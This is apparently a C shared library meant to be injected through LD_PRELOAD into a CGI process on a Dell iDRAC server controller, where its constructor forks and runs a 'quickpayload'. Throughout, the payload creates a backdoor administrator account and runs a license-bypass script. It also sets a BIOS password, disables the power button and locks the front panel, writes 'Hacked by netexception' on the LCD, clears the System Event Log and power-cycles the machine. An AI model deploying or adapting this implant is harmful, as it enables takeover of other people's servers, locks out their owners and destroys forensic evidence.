#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOTE_MAX 250

static void add_worknote(const char *msg)
{
    char *argv[] = {
        "racadm", "lclog", "worknote", "add",
        "-m", (char *)msg,
        NULL
    };

    pid_t pid = fork();
    if (pid == 0) {
        execvp(argv[0], argv);
        _exit(127);
    }
    if (pid > 0)
        waitpid(pid, NULL, 0);
}

/* Exec argv and wait for it to finish.
 * Per-command logging (the old "cmd → output" notes) is commented out;
 * work() now writes one worknote per category instead. */
static void run(char *const argv[])
{
    /*
    int pipefd[2];
    if (pipe(pipefd) < 0)
        return;
    */

    pid_t pid = fork();

    if (pid == 0) {
        /*
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        */

        execvp(argv[0], argv);
        _exit(127);
    }

    if (pid > 0) {
        /*
        close(pipefd[1]);

        char out[OUT_MAX + 1] = {0};
        ssize_t n = read(pipefd[0], out, sizeof(out) - 1);
        close(pipefd[0]);

        int status = 0;
        waitpid(pid, &status, 0);

        * Replace newlines with spaces *
        if (n > 0) {
            for (ssize_t i = 0; i < n; i++) {
                if (out[i] == '\n' || out[i] == '\r')
                    out[i] = ' ';
            }
        }

        char cmd[CMD_MAX];
        cmdString(cmd, sizeof(cmd), argv);

        char note[NOTE_MAX + 32];
        if (n > 0)
            snprintf(note, sizeof(note), "%s → %s", cmd, out);
        else
            snprintf(note, sizeof(note), "%s → (no output, exit %d)",
                     cmd, WIFEXITED(status) ? WEXITSTATUS(status) : -1);

        add_worknote(note);
        */

        waitpid(pid, NULL, 0);
    }
}

static void detachStdio(void)
{
    int fd = open("/dev/null", O_RDWR);

    if (fd < 0)
        return;

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    if (fd > 2)
        close(fd);
}

static void work(void)
{
    /* Start */
    add_worknote("Start of quickpayload");

    /* User admin configuration */
    add_worknote("Category: admin user");
    run((char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminUserName", "{username}", NULL }); // Sets username for user slot 10
    run((char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPassword", "{password}", NULL }); // Sets password for user slot 10
    run((char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPrivilege", "{privilege}", NULL }); // Sets privilege level for user slot 10
    run((char *const[]){ "racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminEnable", "1", NULL }); // Enables user slot 10

    /* iDRAC settings */
    add_worknote("Category: iDRAC - IP");
    run((char *const[]){ "racadm", "set", "iDRAC.IPBlocking.RangeEnable", "0", NULL }); // Disables IP range blocking
    run((char *const[]){ "racadm", "set", "iDRAC.IPMILan.Enable", "0", NULL }); // Disables IPMI over LAN
    run((char *const[]){ "racadm", "set", "iDRAC.WebServer.TLSProtocol", "TLS_1_2_and_higher", NULL }); // Forces TLS 1.2+ only
    run((char *const[]){ "racadm", "set", "iDRAC.Telnet.Enable", "0", NULL }); // Disables Telnet

    /* Services */
    add_worknote("Category: services");
    run((char *const[]){ "racadm", "set", "iDRAC.SSH.Enable", "1", NULL }); // Enables SSH

    /* BIOS and power settings */
    add_worknote("Category: BIOS/power");
    run((char *const[]){ "racadm", "set", "LifecycleController.LCAttributes.CollectSystemInventoryOnRestart", "1", NULL }); // Collects hardware inventory on every restart
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.SysProfile", "Custom", NULL }); // Sets system profile to Custom
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.EnergyPerformanceBias", "MaxPower", NULL }); // Biases CPU for maximum performance
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.ProcPwrPerf", "MaxPerf", NULL }); // Sets CPU power management to maximum performance
    run((char *const[]){ "racadm", "set", "System.Power.Cap.Enable", "Disabled", NULL }); // Disables power capping
    run((char *const[]){ "racadm", "set", "System.Power.Hotspare.Enable", "Disabled", NULL }); // Disables PSU hot-spare
    run((char *const[]){ "racadm", "set", "BIOS.ProcSettings.ControlledTurbo", "Enabled", NULL }); // Enables controlled turbo
    run((char *const[]){ "racadm", "set", "BIOS.ProcSettings.ProcTurboMode", "Enabled", NULL }); // Enables Turbo Boost
    run((char *const[]){ "racadm", "set", "BIOS.ProcSettings.LogicalProc", "Enabled", NULL }); // Enables Hyper-Threading
    run((char *const[]){ "racadm", "set", "BIOS.ProcSettings.ProcVirtualization", "Enabled", NULL }); // Enables CPU virtualization (VT-x)
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.UncoreFrequency", "MaxUFS", NULL }); // Sets uncore frequency to maximum
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.MemFrequency", "MaxPerf", NULL }); // Sets memory frequency to maximum performance
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.MemPatrolScrub", "Disabled", NULL }); // Disables memory patrol scrubbing
    run((char *const[]){ "racadm", "set", "BIOS.ProcSettings.DynamicCoreAllocation", "Disabled", NULL }); // Disables dynamic core allocation
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.ProcCStates", "Disabled", NULL }); // Disables CPU C-states
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.ProcC1E", "Disabled", NULL }); // Disables C1E power state
    run((char *const[]){ "racadm", "set", "BIOS.SysProfileSettings.MonitorMwait", "Disabled", NULL }); // Disables Monitor/Mwait
    run((char *const[]){ "racadm", "set", "System.ThermalSettings.ThermalProfile", "MaximumPerformance", NULL }); // Sets thermal profile for max performance
    run((char *const[]){ "racadm", "set", "System.ThermalSettings.FanSpeedOffset", "2", NULL }); // Increases fan speed offset

    /* Security settings */
    add_worknote("Category: security");
    run((char *const[]){ "racadm", "set", "BIOS.SysSecurity.PwrButton", "Disabled", NULL }); // Disables power button
    run((char *const[]){ "racadm", "set", "BIOS.SysSecurity.SetupPassword", "biospassword", NULL }); // Sets BIOS setup password
    run((char *const[]){ "racadm", "set", "System.LCD.FrontPanelLocking", "2", NULL }); // Locks front panel buttons

    /* Job queue */
    add_worknote("Category: job queue");
    run((char *const[]){ "racadm", "jobqueue", "create", "BIOS.Setup.1-1", "-r", "pwrcycle", "-s", "TIME_NOW", NULL }); // Creates BIOS job and power cycles immediately

    /* Enterprise bypass */
    add_worknote("Category: enterprise bypass");
    run((char *const[]){ "sh", "/avct/sbin/enterprise.sh", NULL }); // Runs enterprise license bypass script

    /* LCD settings */
    add_worknote("Category: LCD");
    run((char *const[]){ "racadm", "set", "System.LCD.Configuration", "0", NULL }); // Sets LCD to user-defined string mode
    run((char *const[]){ "racadm", "set", "System.LCD.UserDefinedString", "Hacked by netexception | Contact: me@nullbyte.rip", NULL }); // Sets custom LCD text
    run((char *const[]){ "racadm", "set", "System.LCD.HideErrs", "0", NULL }); // Hides error messages on LCD
    run((char *const[]){ "racadm", "set", "System.LCD.ErrorDisplayMode", "2", NULL }); // Sets LCD error format to simple
    run((char *const[]){ "racadm", "clrsel", NULL }); // Clears System Event Log
    run((char *const[]){ "racadm", "clearasrscreen", NULL }); // Clears last crash screen

    /* End */
    add_worknote("End of quickpayload");
}

static void main(void) __attribute__((constructor));
static void main(void)
{
    pid_t pid = fork();

    if (pid > 0) {
        /* parent (CGI) answers the request immediately.
         * Clear the preload so this process's later children do not
         * load us again and re-trigger the whole payload. */
        unsetenv("LD_PRELOAD");
        return;
    }

    if (pid == 0) {
        /* child: the one that actually runs the payload.
         * Clear the preload before work() so every racadm/sh it execs
         * runs clean instead of re-firing this constructor. */
        setsid();
        unsetenv("LD_PRELOAD");
        detachStdio();
        work();
        _exit(0);
    }

    /* pid < 0: fork failed, nothing more we can do */
}
